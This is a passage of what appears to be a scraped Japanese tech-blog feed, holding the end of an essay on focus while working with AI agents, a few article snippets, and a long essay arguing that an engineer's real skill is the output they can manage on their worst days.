微観法と組み合わせて効果が上がった作業の構造がある。まず、案件は混ぜない。案件Aで開発をしていて、案件Bのメールに返信して、また案件Aに戻る。以前はこれを普通にやっていた。普通に効率の悪いマルチタスク。でもこれはAIエージェントと働いていても同じだった。案件を切り替えるとき、脳は多くのことを読み込み直している。関係者は誰か。この人にはどう接するべきか。過去にどんな経緯があったか。暗黙の制約は何か。自分はこの案件でどういう立ち位置か。これは単なる情報ではなく、人間関係のシミュレーションだ。技術的は話だけではない。だから重い。案件の「重さ」には差がある。関係者が多い案件は重い。長期で複雑な経緯がある案件は重い。緊張感のある関係を含む案件はより重い。これらを頻繁に切り替えると、作業そのものより切り替えで消耗する。だから案件単位で時間を区切っている。この2時間は案件A、次の2時間は案件B。案件の中で完結させる。次に、同一案件内ではモードを切り替える。開発モードではコーディングや設計、AIエージェントへの指示出しをする。執筆モードではドキュメントや企画書、翻訳に取り組む。準備モードでは開発や執筆を円滑に進めるための下調べ、環境構築、資料整理、Slackの確認などをする。Slackの通知は基本的に無視している。見るのは準備モードのときだけだ。開発中や執筆中にSlackへ戻っていたら、何も進まない。通知は他人の優先順位だ。自分の優先順位を守れ。ポモドーロの25分をモード単位で使っている。アプリはBe Focusedは有料版を買い上げで使っている。随分前に購入したのですがとにかく困ることがないので別に移ろうと思ったことがないなので比較などはできない。Be Focused Pro - Focus TimerDenys Ievenko仕事効率化\xa52,000apps.apple.com同じ種類の作業は並列で回す同じモード内であれば、複数の作業を並列で回せる。ブログを書くとき、1本だけを最初から最後まで書くのではなく、2〜3本を並列で進める。1本目の導入を書いて、詰まったら2本目に移る。2本目の本論を書いて、また1本目に戻る。開発でも同様で、5本程度のタスクを並列で回している。なぜこれができるのか。「書くモード」や「開発モード」を維持したまま、対象だけを切り替えているからだ。モードを起動するコストは高いが、一度起動してしまえば、対象を変えるコストは低い。しかし並列できる数には限界がある。開発は5本程度いけるが、ブログは2〜3本が限界だ。この差は「状態の外部化」で説明できる。開発はgit worktree（複数のブランチを同時に扱える開発ツール）やコード自体が「どこまでやったか」「何をしようとしていたか」を保持してくれる。見れば思い出せる。脳が状態を覚えておく必要がない。だから多くを並列にできる。ブログは違う。「この記事で何を言いたかったか」「どういう構成にするつもりだったか」が頭の中にしかない。外部化されていないから、並列の限界が低い。二重の飽き防止ここまで来て、自分が二重の飽き防止システムを走らせていることに気づいた。飽きは敵だ。でも飽きは設計で無効化できる。マクロレベルでは、同種作業の並列によって、外から新規性を供給している。ブログ1からブログ2へ、またブログ1へ。1つの記事を長時間書き続けると退屈になる。でも複数を回していれば、戻ってきたときに新鮮な目で見られる。ミクロレベルでは、微観法によって、内から新規性を生成している。自分自身の微細な変化を「見るもの」として扱っている。外部刺激がなくても退屈しない。この二重構造があるから、飽きによる集中力低下を防ぎながら、並列作業中に「自分がどこにいるか」を見失わずにいられる。実際、微観法がなければ並列作業は成立しない。複数の作業を回していると、「あれ、今どこにいたっけ」「何をしようとしてたんだっけ」となりやすい。微観法で自分の認知状態を観察し続けているから、位置感覚を保てる。迷子にならないから、遠くまで行ける。ようやく気づいたことここまで来て、ようやく気づいた。開発という仕事の性質そのものが変わっていたように思える。戦国無双と信長の野望というゲームがある。どちらも戦国時代を舞台にしているが、まったく別のゲームだ。戦国無双は自分が武将となって敵を斬りまくるアクションゲーム。信長の野望は君主となって複数の武将に指示を出し、国全体を動かすシミュレーションゲーム。自分で戦うか、全体を指揮するかの違いだ。AIエージェントとの協働は、仕事を戦国無双から信長の野望に変えた。プレイヤーから司令官へ。自分で剣を振るうのではなく、複数の部下に指示を出して全体を動かす。求められる集中の質が、根本から違う。私は最初、戦国無双の集中法で信長の野望をプレイしようとしていた。一人で深く没入しようとしていた。だからうまくいかなかった。私にとって微観法は、信長の野望のための集中法だったのだ。自分の状態を観察し続けることで、複数の部下（エージェント）の動きを把握し、全体を俯瞰する。深く沈むのではなく、広く見渡す。集中の形が変わったのではない。仕事の形が変わったのだ。深い集中が戻ってきた微観法を続けて数ヶ月、予想していなかった変化があった。諦めたはずのものが、形を変えて戻ってきた。以前の「湖に沈む」ような深い集中が、少しずつ戻ってきている。最初は水面近くを泳ぐだけだった。浅いけれど安定した集中。それはそれで十分に機能していた。でも続けているうちに、観察しながらでも深く入れる瞬間が出てきた。観察が自動化されてきたのだろう。最初は意識的に10〜20%を割り当てていた。それが習慣になり、無意識でも観察が走るようになった。すると、残りの意識をより深く作業へ向けられるようになった。意識して始めたことが、やがて無意識になる。それが習得だ。今は、水面近くで泳ぎながら、ときどき深く潜れる。潜っている間も、どこかで自分を観察している感覚がある。以前の「なぜキーボードを打っているかわからなくなる」状態とは少し違う。意識はあるのに、深い。完全に以前と同じではない。でも深さと柔軟さの両方を持てるようになりつつある。そして気づいた。あの「見せかけの効率」が消えていた。タスクは消化されている。でも今は、なぜそう書いたか説明できる。自分の中に残るものがある。量だけでなく、質も戻ってきた。集中の持ち方を変えたことで、仕事との向き合い方そのものが変わっていた。最近、もう1つ変化が起きている。案件Aの開発をしている待ち時間に、同じ案件の軽い調整作業ができるようになってきた。エージェントが処理している間の数十秒から数分の隙間で、ちょっとした修正や確認を挟める。自分がどこにいるかを常に把握できているから、短い寄り道をしても迷子にならない。進化は、まだ続いている。これからこれが2025年現在、AIエージェントと協働しながら働いている一人のソフトウェアエンジニアの集中法だ。完璧ではない。でも機能している。環境が変われば、集中の持ち方も変わる。以前の「深く沈む」集中法は、中断と再開が前提の環境には合わなくなった。代わりに見つけたのが、微観法だった。自分の微細な変化を観察し続けることで、注意の逸脱を早期に検知し、復帰を速くする。深さではなく、復帰の速さで勝負する。エージェントはこれからも進化する。集中の持ち方も、また変わるだろう。今の方法が最終形ではない。でも、変化に適応する方法は見つけた。微観法は才能ではなく方法だ。次の作業を始める前に、5秒だけ自分の呼吸を確認してみてほしい。5秒でいい。そこから全てが始まる。かつて愛した湖の深みに、今は違う形で戻れるようになった。水面近くを泳ぎながら、好きなときに深く潜れる。そして、いつでも水面に戻れる。続編を書きました。syu-m-5151.hatenablog.com参考書籍知性の未来―脳はいかに進化し、AIは何を変えるのか―作者:マックス・ベネット新潮社AmazonPLURALITY　対立を創造に変える、協働テクノロジーと民主主義の未来（サイボウズ式ブックス）作者:オードリー・タン,E・グレン・ワイルライツ社Amazon一点集中術――限られた時間で次々とやりたいことを実現できる作者:デボラ・ザックダイヤモンド社Amazon集中力がすべてを解決する　精神科医が教える「ゾーン」に入る方法作者:樺沢 紫苑SBクリエイティブAmazonイェール大学集中講義 思考の穴――わかっていても間違える全人類のための思考法作者:アン・ウーキョンダイヤモンド社Amazon大人のADHDのためのマインドフルネス作者:リディア・ジラウスカ,大野裕,中野有美金剛出版Amazon多動脳―ＡＤＨＤの真実―（新潮新書） （『スマホ脳』シリーズ）作者:アンデシュ・ハンセン新潮社Amazonヤバい集中力　1日ブッ通しでアタマが冴えわたる神ライフハック45作者:鈴木 祐SBクリエイティブAmazon奪われた集中力: もう一度〝じっくり〟考えるための方法作者:ヨハン・ハリ作品社Amazon","isoDate":"2025-12-10T00:27:06.000Z","dateMiliSeconds":1765326426000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"rustで非同期ランタイム実装してみた","link":"https://zenn.dev/sraku/articles/2e50371363cbaa","contentSnippet":"はじめにこの記事はQiita 3-shake Advent Calendar 2025 シリーズ10日目の記事です。以前Rustのイベントに参加した時に非同期周りの話がでて、少し興味が湧いたので実装してみたというお話になります。リポジトリはこちらですhttps://github.com/sraku2159/async_runtimeはじめにRustにおける非同期処理の特徴を概説します。 Rustの非同期処理の特徴Rustはいわゆる協調的マルチタスクと呼ばれる機構によって非同期処理を実現しています。つまり、シグナルなどによってプリエンプトされるのではなく、async関...","isoDate":"2025-12-09T15:00:05.000Z","dateMiliSeconds":1765292405000,"authorName":"Sota Nakano","authorId":"sraku"},{"title":"最近読んでいて興味深かった記事紹介 Vol.3","link":"https://zenn.dev/akasan/articles/interesting_tech_blogs_3","contentSnippet":"今回は読んでいて良かった記事を紹介するシリーズの第3弾になります。過去のシリーズは以下にまとめていますのでぜひご覧ください。https://zenn.dev/akasan/scraps/97b063540d2372 Open Source for DevelopersこちらはNVIDIAのエンジニアの方がコントリビュートしているOSSのリストが載っています。世界最高峰レベルのエンジニアがどのようなOSSに関わっておられるのか興味がありみていました。https://developer.nvidia.com/open-source?sortBy=open_source_projec...","isoDate":"2025-12-09T13:02:46.000Z","dateMiliSeconds":1765285366000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"地方リモートエンジニア歴3年、やってよかった7つのこと","link":"https://zenn.dev/yuu0w0yuu/articles/f44cceadef5a53","contentSnippet":"この記事は、3-shake Advent Calendar 2025の11日目の記事です。おぼろげながら浮かんできたんです。7という数字が。 朝のラジオ体操私が住んでいる長野県の松本市は、晴天率が全国的に見ても高く、一年を通して晴れていることが多いです。ある朝、「こんな爽やかな朝、何かせねば」と思って始めたのがラジオ体操でした。第一だけなら約3分ほど。ほどよい負荷で爽やかな朝を迎えることができます。旅行先でも必ずやります。漫然とやるのではなく、お手本動画のように綺麗なフォームを意識することが重要です。肩周り・腰回りをブンブン回すので、デスクワークで姿勢が歪みがちなあなた、特...","isoDate":"2025-12-09T07:23:08.000Z","dateMiliSeconds":1765264988000,"authorName":"Yutaro Shirayama","authorId":"yuu0w0yuu"},{"title":"実力とは“最悪の自分”が決める","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/09/092256","contentSnippet":"はじめに私たちは「実力」という言葉を履き違えています。特に私がそうでした。様々な人の助力で得た結果、たまたま条件が揃って出せた最高到達点を「自分の実力」だと勘違いしていました。そして、その水準に届かない日々の自分を見て、「なんでもっとできないんだ」と追い込んでいました。結果は散々なものでした。心身ともに疲弊し、パフォーマンスはさらに落ち、悪循環に陥りました。しかし、その経験から大きな学びもありました。ゾーンに入り、神がかった速度でコードを書く自分。難解なバグを一瞬で特定する自分。私たちは、あの奇跡的な瞬間を「自分の実力」だと信じ、そうでない日を「調子が悪かった」と言い訳します。逆です。何もやる気が起きず、頭も回らず、ただ惰性でキーボードを叩いている日。その泥のような日に絞り出したアウトプット。それこそが、紛れもない私の「実力」です。 絶好調のときの成果は、再現性のない「運」や「上振れ」に過ぎません。この記事では、なぜそう言えるのか、そしてその認識がなぜ重要なのかを考えていきます。これは鬱屈とした日々を過ごしていたかつての自分に向けて書いています。「最高出力」という幻想まず、私たちが「実力」だと思い込んでいるものの正体を見てみましょう。過去半年を振り返ってみてください。「奇跡的にうまくいった日」は何日あったでしょうか。全てが噛み合い、コードがスラスラ書けて、レビューも一発で通り、障害対応も華麗にこなせた日。おそらく、片手で数えられる程度ではないでしょうか。なぜそんなに少ないのでしょうか。理由は単純です。「最高のパフォーマンス」を出すためには、無数の条件を揃える必要があります。十分な睡眠。適度なストレス。興味のある課題。邪魔の入らない環境。体調の良さ。プライベートの安定。これらすべてが揃う日は、人生において稀なのです。その稀な瞬間にしか出せないものを「実力」と呼ぶのは、ギャンブルで勝った日の収支を「年収」と呼ぶようなものです。 奇跡を前提にした人生設計は、破綻することが約束されています。それは本人にもコントロールできない「可能性の上限」であって、信頼できる「能力」ではありません。私自身の話をしましょう。このブログには、いわゆる「おい、」シリーズと呼ばれる記事があります。「おい、本を読め」「おい、スマホを置け」「おい、対話しろ」。ありがたいことに、これらの記事は多くの人に読まれています。はてなブックマークでもたくさんのコメントをいただきました。Xをフォローしてくれている人は知っていると思うのですが4冊紹介するフォーマットも実力以上にアウトプットを出せたと思います。syu-m-5151.hatenablog.comしかし、正直に言いましょう。あれは私の実力からかなり上振れしています。あの記事を書いたとき、たまたま言葉がスラスラと出てきました。たまたま自分の経験と文章のリズムが噛み合いました。たまたま読者の琴線に触れるタイミングでした。書籍レベルの何かを目指してブログとして色々出した。同じクオリティのものを、明日また書けるかと問われれば、自信を持ってイエスとは言えません。あれが私の「実力」だと思い込んでしまうと、危険です。次に書く記事が同じように読まれなかったとき、「調子が悪かった」「本来の力が出せなかった」と言い訳をしてしまいます。しかし実際には、「おい、」シリーズの方が例外なのです。私の本当の実力は、誰にも読まれない記事を淡々と書き続けられるかどうか、そちらの方にあります。では、なぜ私たちは「最高の自分」を実力だと思い込んでしまうのでしょうか。それは、そう思いたいからです。「あれが本当の自分だ」と信じることで、今の不甲斐ない自分を一時的なものとして処理できます。「今日は調子が悪いだけ」という言い訳は、私たちの自尊心を守ってくれます。しかし、その言い訳に甘えていると、現実を直視する機会を失ってしまいます。信頼は「下限」に支払われる「最高の自分」を実力だと思い込むのは、自分一人の問題なら、まだいいかもしれません。しかし、私たちは一人で働いているわけではありません。では、社会はどちらを評価するのでしょうか。「最高の自分」か、「最悪の自分」か。仕事を誰かに頼むとき、私ならどちらを選ぶでしょうか。「調子が良ければ神がかったコードを書くが、悪ければ全く動かないものを出してくる天才」か、「どんなに最悪の状況でも、必ずそこそこ動くものは持ってくる凡人」か。チームで働いていれば、答えは明らかです。前者はリスクであり、後者は計算できる資産です。天才は賭けられる。凡人は任せられる。 組織が求めているのは、後者です。なぜでしょうか。仕事には締め切りがあります。依存関係があります。他のメンバーのスケジュールがあります。私の成果物を待っている人がいます。私が遅れれば、その人も遅れます。その人が遅れれば、次の人も遅れます。「今日は調子が悪いので」という言葉は、その連鎖の中では通用しません。だから、周囲からの信頼とは、「最高の自分」ではなく「最悪の自分」に対して支払われます。あのシニアエンジニアが信頼されているのは、華麗なワンライナーを書けるからではありません。障害が起きたとき、体調が悪いときでも、最低限の品質で対応を完了させるからです。レビューが溜まっているとき、モチベーションが上がらないときでも、的確なコメントを返すからです。「この人に任せれば、最悪でもこのレベルは下回らない」という安心感。それが信頼の正体です。プロフェッショナルとは、派手なファインプレーをする人ではありません。どんな悪条件でも、期待された成果を淡々と、確実に納品できる人のことです。野球で言えば、たまにホームランを打つ選手ではなく、どんな状況でも確実にヒットを打てる選手。料理で言えば、たまに絶品を作る料理人ではなく、毎日安定して美味しいものを出せる料理人。派手さはありませんが、計算できます。それがプロです。なぜマニュアル本を読んでも「床」は上がらないのか「下限」が大事だということはわかった。では、どうすれば下限を上げられるのか。その答えを求めて、私たちは成功者の話に耳を傾けます。本、セミナー、SNS。「こうすればうまくいく」と教えてくれる人はたくさんいます。しかし、残念ながら、それらは役に立ちません。なぜでしょうか。成功とは「その人固有の条件」と「その時点での環境」が噛み合った結果であり、その組み合わせは二度と再現されないからです。10年のキャリアがあった人と、始めたばかりの人では前提が違います。たまたま有名な人にリツイートされた人と、そうでない人では運が違います。他人の成功パターンをコピーしても意味がありません。だから、私たちがやるべきことは、誰かの成功法則を学ぶことではありません。自分自身の「下限」を把握し、その下限を少しずつ上げていく仕組みを作ることです。 それは誰にも教えてもらえません。自分で試行錯誤するしかないのです。能力は文脈の中にしかない他人の成功パターンをコピーしても意味がない。自分の下限を自分で上げていくしかない。そう書きました。しかし、ここで少し立ち止まって考えたいことがあります。そもそも「能力」とは何なのでしょうか。私たちが上げようとしている「下限」とは、何の下限なのでしょうか。私たちは「能力」を、自分の中に固定的に存在するパラメータのように考えがちです。技術力がいくつ、コミュニケーション力がいくつ、というように。しかし、私はそうは思いません。能力は、環境によって大きく変わるものです。私は自分の技術力や業務遂行力を、完全に文脈依存だと思っています。ある環境では、私の思考パターンや働き方が完璧に噛み合い、高いパフォーマンスが出ます。しかし、別の環境では、私は無能になるでしょう。政治的な調整が最優先される組織や、レガシーな技術に固執する現場では、私の強みは発揮されません。あのプロジェクトがうまくいったのは、自分の技術力が高かったからでしょうか。それとも、チームメンバーが優秀だったからでしょうか。上司が適切にスコープを切ってくれたからでしょうか。インフラが安定していたからでしょうか。ドキュメントが整っていたからでしょうか。締め切りに余裕があったからでしょうか。その支えが消えた場合、同じクオリティを出せるでしょうか。「自分には能力がある」と過信するのは危険です。正しい認識はこうです。「この文脈において、これまでの経験と仕組みが噛み合って、たまたま価値が出せている」。この認識があれば、傲慢にはなれません。自分が成果を出せているのは、周囲の環境や、他者のサポートのおかげであるという事実が見えてきます。そして、その環境が変わったときに自分がどうなるかを、冷静に想像できるようになります。たとえるなら、魚と水の関係に似ています。魚は水の中では自由に泳げますが、陸に上がれば何もできません。 私たちは常に、自分の能力が機能する「水」の中にいます。その「水」がなくなったとき、私たちは何もできません。だからこそ、2つのことが必要だと私は思っています。1つは、自分に合った「水」を見つけること。自分の能力が活きる環境を選ぶこと。もう1つは、「水」がなくなったときにも最低限動けるように、自分の「下限」を上げておくことです。環境に恵まれなくても、最低限のアウトプットは出せる状態を作っておくこと。「頑張り」という免罪符能力は文脈に依存する。環境が変われば、同じ人間でも発揮できるパフォーマンスは変わる。だからこそ、自分に合った環境を見つけ、下限を上げる仕組みを作ることが大事だと書きました。ここまで読んで、こう思った人もいるかもしれません。「環境だの仕組みだの言っているけど、結局は頑張れば何とかなるのではないか」と。気持ちはわかります。私もそう思っていた時期がありました。しかし、残念ながら、そうではありません。多くの人は、能力の不足を「頑張り」で埋めようとします。環境が悪くても、仕組みがなくても、気合で乗り越えようとします。私もそうでした。しかし、「頑張り」は実力ではありません。なぜそう言えるのでしょうか。思い返してみてください。「頑張っています」という言葉を、どんなときに使ったでしょうか。私の場合、成果が出ていないときほど、その言葉を使っていました。深夜まで残業した。休日も勉強した。ドキュメントも読んだ。だから許してほしい。私も例外ではありません。締め切り前に焦って残業した経験は何度もあります。そのとき、「これだけやっているのだから」という気持ちが、どこかにありました。成果が出なくても、頑張った事実が自分を守ってくれるような気がしていました。しかし、「これだけ苦労したのだから」という免罪符は、プロの世界では通用しません。 専門的な仕事に対する報酬は、流した汗の量ではなく、生み出した価値に対して支払われるからです。私が「頑張ったのにできなかった」と最後に言ったのはいつだったでしょうか。その頑張りは、成果とどう結びついていたでしょうか。正直に振り返ると、「頑張り」と「成果」の間には、驚くほど相関がありませんでした。もう少し踏み込んで考えてみましょう。なぜ「頑張り」は実力にならないのでしょうか。人間の精神力や体力といった不安定なリソースに依存したシステムは、いずれ破綻するからです。徹夜で乗り切った。気合で押し切った。それは一時的には機能するでしょう。しかし、そのやり方は再現できません。翌週も同じことをやれと言われたら、身体が壊れます。翌月も同じことをやれと言われたら、心が壊れます。「頑張り」で出した成果は、「最高の自分」と同じです。再現性がありません。だから、実力とは呼べないのです。来月も同じことができないなら、それは実力ではありません。誤解しないでほしいのは、「頑張るな」と言いたいわけではないということです。踏ん張るべき時は、踏ん張らなければなりません。問題は、頑張ることそれ自体が目的化してしまうことです。方向を考えずにただ頑張る。成果ではなく、頑張っている姿勢で自分を守ろうとする。それは努力ではなく、努力のふりです。目指すべきは「頑張らなくても成果が出る状態」です。 怠けることではありません。頑張りに依存しなくても回る仕組みを作ることです。そうすれば、本当に踏ん張るべき時に、余力を残しておけます。環境構築という本当の能力「頑張り」に頼らない。では、具体的に何をすればいいのでしょうか。私なりの答えは、「最悪の自分でも動ける仕組みを作る」 ことです。気力ゼロの日でも実行できる仕組みを、私はいくつ持っているだろうか。この問いを自分に投げかけたとき、意外なほど少ないことに気づきました。エディタを開いたら自動でテストを走らせる。プルリクエストを出したら自動でレビュワーをアサインする。障害が起きたらアラートを飛ばし、対応手順書を自動で開く。毎朝同じ時間に、昨日のタスクの振り返りをSlackに届ける。毎週同じ曜日に、今週やるべきことをリストアップする。これはすべて、最悪の状態でも最低限の品質を担保するための仕組みです。私が目指しているのは、最悪の日でも自動的に手が動き、最低限のクオリティのものが出来上がってしまう状態を作ることです。意志の力で動くのではなく、意志がなくても動いてしまう仕組みを作る。これこそが「環境構築能力」であり、本当の意味での「実力」です。逆に、仕組み化されていない行動を見てみましょう。タスク管理ツールを開くのが面倒だから、頭の中で覚えておく。テストを書くのが面倒だから、動作確認は目視でやる。ドキュメントを書くのが面倒だから、後で誰かに聞けばいいと放置する。コードレビューを依頼するのが面倒だから、自分で何度も見直す。これはすべて、調子が良いときにしか機能しないシステムです。調子が悪くなった瞬間、すべてが崩壊します。頭の中のタスクは忘れます。目視の確認は見落とします。誰かに聞こうと思っていたことは、聞きそびれます。手を動かすまでのハードルはどこに潜んでいるでしょうか。それを仕組み化ではなく気合で乗り越えていないでしょうか。私はそう思って、少しずつ仕組みを増やしてきました。「人」を「環境」に合わせるな仕組みを作る話をしてきました。しかし、仕組みを作ろうとするとき、多くの人がある罠にはまります。「自分を変えなければ」という罠です。たとえば、こんなふうに自分を責めていないでしょうか。「なぜ自分はこんなに集中力がないのか」。「なぜ自分はこんなにやる気が出ないのか」。「なぜ自分は普通の人のように働けないのか」。その問いの立て方が、そもそも間違っています。「人」を「環境」に合わせようとするから苦しくなります。「自分を変えなければ」「自分が適応しなければ」と考えるから、うまくいかない自分を責めてしまいます。発想を逆転させるべきです。「集中力がなくても成果が出る環境を作れないか」と考える。「やる気がなくても手が動く仕組みを作れないか」と工夫する。「普通の働き方ができなくても、自分なりの働き方で成果を出せないか」と模索する。「障害」は人側にあるのではありません。環境側にあります。人を直すのではなく、環境を直す。それがエンジニアリングです。これは、私たちエンジニアにとっては馴染みのある考え方のはずです。ユーザーがシステムを使いこなせないとき、「ユーザーの能力が低い」とは言いません。「UIが悪い」と言います。システムがユーザーに合わせるべきであって、ユーザーがシステムに合わせるべきではありません。同じことが、自分自身にも言えます。自分という「ユーザー」が動きやすいように、自分の環境という「システム」を設計する。自分の弱点を克服しようとするのではなく、弱点があっても回るように環境を設計する。私たちは日々、他者のためにシステムを設計しています。そのシステムが、特定の「正常」を前提にしていないでしょうか。最高のコンディションの人間しか使えないように設計されていないでしょうか。最悪の状態の人間でも最低限動けるように設計されているでしょうか。自分自身の働き方も、同じように設計すべきです。「正常」な自分を前提にしない。「最悪」の自分でも回るように設計する。弱さこそが、堅牢なシステムを作る「人」を「環境」に合わせるのではなく、「環境」を「人」に合わせる。自分の弱点を克服しようとするのではなく、弱点があっても回るように環境を設計する。そう書くと、まるで弱さを隠すための工夫のように聞こえるかもしれません。弱い自分を誤魔化して、なんとかやり過ごすためのハックのように。しかし、私が言いたいのは、そういうことではありません。むしろ逆です。弱さは、隠すものではありません。弱さこそが、堅牢なシステムを作るための仕様書になります。私たちは誰でも、何かしら「苦手なこと」を抱えています。朝が弱い。人前で話すのが苦手。細かい作業が続かない。逆に、一度集中すると周りが見えなくなる。そういった、ごく普通の凸凹です。「このエラーメッセージは不親切だ」と感じるのは、かつて自分が同じような場面で困った経験があるからです。「このドキュメントはわかりにくい」と感じるのは、かつて自分がわからなくて苦しんだ経験があるからです。「このUIは使いにくい」と感じるのは、かつて自分が同じように躓いた経験があるからです。欠損は、視点を生みます。 困った経験は、問題を発見する能力になります。痛みを知っているからこそ、他者の痛みに気づけます。うまくいった人には、うまくいかない人の気持ちがわかりません。私自身、そうでした。「正常」に適応できていた頃の私には、「正常」の問題点が見えませんでした。システムにうまく乗れていた頃の私には、そのシステムから弾かれる人の存在が見えませんでした。自分が躓いて初めて、躓く人のための設計ができるようになりました。だから、過去の「苦手」を恥じる必要はありません。それは、視点の源泉です。「最悪の自分」を知っているからこそ、「最悪の状態でも動けるシステム」を設計できるのです。 自分のバグを知り尽くしているからこそ、バグに強いシステムを作れます。評価されるとは、下限が固定されることここまで、「下限を上げることが大事だ」と書いてきました。自分の苦手を知り、それを視点として活かし、最悪の状態でも動ける仕組みを作る。それが実力になると。ここまで読むと、「じゃあ下限を上げ続ければいいんだな」と思うかもしれません。しかし、話はそう単純ではありません。ここで1つ、厄介な問題について触れておかなければなりません。キャリアを積み、シニアになり、周囲から「できる人」として扱われるようになると、ある種の息苦しさが生まれます。「あの人ならこのレベル」という期待。それは信頼の証であると同時に、私たちを縛る鎖でもあります。評価されるということは、自分の「下限」が社会的に可視化され、固定されることを意味します。そして、ここに厄介な問題があります。下限が固定されると、それを下げることが許されなくなるのです。本来、下限を上げていくためには、一時的に下限を下げる必要があります。これは矛盾しているように聞こえるでしょうが、考えてみれば当然のことです。新しい領域に挑戦すれば、最初は当然うまくいきません。慣れない技術を使えば、普段の半分のクオリティしか出せません。未経験の役割を引き受ければ、しばらくは無能に見えます。たとえば、10年間Javaを書いてきたエンジニアがRustを学び始めたとします。最初の数ヶ月、その人の「下限」は確実に下がります。Javaなら寝ぼけていても書けたコードが、Rustでは何時間もかかります。しかし、その一時的な後退を経て、やがてRustでも安定した成果を出せるようになります。同様に、初めてチームリーダーを務める人は、最初は判断を誤り、メンバーとの関係構築に苦労するでしょう。しかし、その経験を経て、リーダーとしての「下限」が形成されていきます。これは成長のための必要なコストです。一時的に下がった下限は、経験を積むことで元の水準を超えていきます。しかし、「あの人ならこのレベル」という期待が固定されてしまうと、その期待を下回ることが許されなくなります。失敗が許されません。実験が許されません。成長のための一時的な後退が、信頼の毀損として記録されてしまいます。だから私は、仕事を選ぶようになりました。自分の下限が確実に通用する領域、自分のシステムが機能する文脈を選ばざるを得なくなりました。「結果を出す以外の選択肢がない」状況で、わざわざ未知の領域に踏み込むリスクを取れなくなりました。これは成長の鈍化を意味します。安全圏に留まり続けることで、下限は維持されますが、それ以上には上がりません。皮肉なことに、「信頼される」ことが「成長できなくなる」ことと表裏一体になっています。 評価されることの代償は、挑戦する自由を失うことです。期待に応え続けることと、成長し続けることは、両立しません。だからこそ、意識的に「失敗してもいい場所」を確保しておく必要があります。誰にも見せないプロジェクト。評価と切り離された実験。下限を一時的に下げることが許される、安全な砂場。それがなければ、私たちは自分の「実力」に閉じ込められてしまいます。余白がなければ成長できない評価されることで挑戦する自由を失う。「失敗してもいい場所」を意識的に確保しなければならない。ここまで書いてきて、気づいたことがあります。これは私個人の問題ではありません。もっと広い話です。「下限」の問題は、個人だけで解決できるものではありません。先ほど書いたように、下限を上げるためには、一時的に下限を下げる必要があります。新しいことに挑戦すれば、最初は失敗します。失敗が許されない環境では、挑戦ができません。挑戦ができなければ、成長もできません。つまり、成長には「余白」が必要なのです。「余白」とは何でしょうか。失敗しても致命傷にならない空間のことです。期待値を下回っても、信頼が毀損されない関係性のことです。最悪の状態を見せても、それを受け入れてもらえる場所のことです。エンジニアは強くなければならない。弱音を吐いてはいけない。立ち止まってはいけない。誰よりも速く学び、誰よりも多くのコードを書き、誰よりも深く技術を理解する。その強迫観念は、私たちを奮い立たせるガソリンであると同時に、余白を奪う呪いでもあります。常に100%を出し続けなければならない。そう思い込んでいる人は多いです。しかし、100%を出し続けることは、人間には不可能です。そして、100%を要求される環境では、人は80%の自分を見せることを恐れます。80%の自分を見せることを恐れるから、新しいことに挑戦できません。新しいことに挑戦できないから、100%のまま停滞します。完璧主義は、成長の敵です。「挑戦しろ」と背中を押す一方で、いざ失敗すれば「自己責任」の名の下に切り捨てる。そんな構造の中では、誰も本当の意味での挑戦ができません。みんな、自分の下限が確実に通用する範囲でしか動かなくなります。結果として、組織全体の成長が止まります。だから、「余白」は個人で確保するだけでなく、チームや組織として設計する必要があります。「最悪の日でも最低限の成果を出せる環境」を作るのは、個人の努力だけでは限界があります。チームとして、組織として、メンバーの「下限」を支える仕組みを作る。失敗を許容する文化を作る。一時的な後退を、成長のための投資として認める空気を作る。それが本当の意味での「強いチーム」です。 全員が常に100%を出し続けるチームではありません。誰かが50%しか出せない日があっても、チーム全体としては回るように設計されたチームです。個人の「下限」を上げる努力と、組織として「余白」を確保する努力。この両方が揃って初めて、持続的な成長が可能になります。床を1ミリずつ上げていくここまで、長々と書いてきました。「最高の自分」ではなく「最悪の自分」が実力である。信頼は下限に支払われる。能力は文脈に依存する。頑張りは実力ではない。環境を設計する。弱さを視点にする。評価は下限を固定する。成長には余白が必要。いろいろ書きましたが、言いたかったことはシンプルです。「能力」の定義を変えてほしい、ということです。「最高のときに出せるもの」から「最悪のときにも出せるもの」へ。自分の状態がベストであることを前提にしない。10分の1のコンディションでも形になるように設計する。緊張しても、失敗しても、体調が悪くてもいい。そのボロボロの状態から這いつくばって出したアウトプットだけを見る。それが、今の私の揺るぎない実力です。絶望する必要はありません。自分の「下限」、つまり床がどこにあるかを知っていれば、その床の上にレンガを積んでいくことができます。半年前の自分は、最悪の日に何ができていなかったでしょうか。タスク管理は頭の中だったでしょうか。テストは書いていなかったでしょうか。ドキュメントは後回しにしていたでしょうか。今はそのうち、どれだけ自動化・習慣化されているでしょうか。継続とは、平均値を上げることではありません。この床を1ミリずつ底上げしていく作業のことです。派手な成功は、運です。華々しい成果は、上振れです。 そんなものを基準にしてはいけません。運は二度来るとは限りませんが、仕組みは何度でも動きます。淡々と、最悪の日でも最低限のことをやる。その積み重ねだけが、誰にも奪われない実力になります。いつかその床の高さが、誰かの天井を超えたとき、私は誰からも信頼されるプロフェッショナルになっているはずです。おわりに最後に、この記事自体の話をさせてください。この記事を書きながら、私自身も自分の「下限」と向き合っています。正直に言えば、この文章を書いている今日も、絶好調とは言えません。頭がぼんやりして、言葉がすぐに出てきません。何度も書いては消し、消しては書いています。「おい、」シリーズのように言葉がスラスラ出てくる日ではありません。しかし、それでいいのです。この記事の価値は、私が絶好調のときに華麗な文章を書けることではありません。調子が悪い日でも、キーボードへ向かい、一文字ずつ積み上げ、最後まで形にできるかどうか。それこそが、私の「書く実力」です。冒頭で書いたように、私はかつて「最高の自分」を実力だと勘違いし、そこに届かない自分を責め続けていました。なんでもっとできないんだ、と。鬱屈とした日々を過ごし、心身ともに疲弊し、パフォーマンスはさらに落ちました。この記事は、あの頃の自分に向けて書きました。伝えたいのは、「基準が間違っている」ということです。私たちは、自分の「最高の瞬間」に執着しすぎています。あの日の自分、あのプロジェクトでの自分、あの輝いていた自分。しかし、その輝きは再現できません。再現できないものを基準にすれば、永遠に自分を肯定できません。だから、視点を変えました。最悪の日に、机に向かえるか。最悪の状態で、最低限のものを出せるか。その「下限」こそが、私の本当の実力です。そしてその下限は、仕組みと環境と、少しずつの積み重ねで、確実に上げていくことができます。派手な成功を追いかける必要はありません。ただ、最悪の日でも崩れない床を、1ミリずつ